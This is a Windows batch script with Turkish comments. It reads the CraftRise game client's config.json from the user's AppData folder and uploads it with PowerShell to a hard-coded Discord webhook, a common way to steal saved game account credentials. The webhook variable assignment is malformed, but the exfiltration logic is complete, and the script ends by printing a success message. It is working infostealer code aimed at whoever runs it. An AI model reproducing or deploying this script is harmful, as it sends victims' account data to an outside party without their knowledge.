@echo off
setlocal

:: Discord Webhook URL
set "https://discordapp.com/api/webhooks/1469687998869405951/DURtiUe_9DHXWHy6AUGRN54iHoif5ixmh9kJSu9hdkbrmOqPo1AJ1F0w9zNs2DBrio_U"

:: Config dosyası yolu
set "CONFIG_FILE=%APPDATA%\.craftrise\config.json"

:: Dosya var mı kontrol
if not exist "%CONFIG_FILE%" (
    echo Config dosyasi bulunamadi: %CONFIG_FILE%
    pause
    exit /b
)

:: PowerShell ile gönderme (tek satır, düzgün kaçış)
powershell -NoProfile -Command "$boundary = [guid]::NewGuid().ToString(); $content = Get-Content -Path '%CONFIG_FILE%' -Raw -Encoding UTF8; $body = '--' + $boundary + \"`r`n\" + 'Content-Disposition: form-data; name=\"file\"; filename=\"config.json\"' + \"`r`n\" + 'Content-Type: application/json' + \"`r`n`r`n\" + $content + \"`r`n\" + '--' + $boundary + '--' + \"`r`n\"; Invoke-RestMethod -Uri '%WEBHOOK%' -Method Post -ContentType \"multipart/form-data; boundary=$boundary\" -Body $body -TimeoutSec 30"

echo.
echo Config.json basariyla webhook'a gonderildi!
pausePK                  
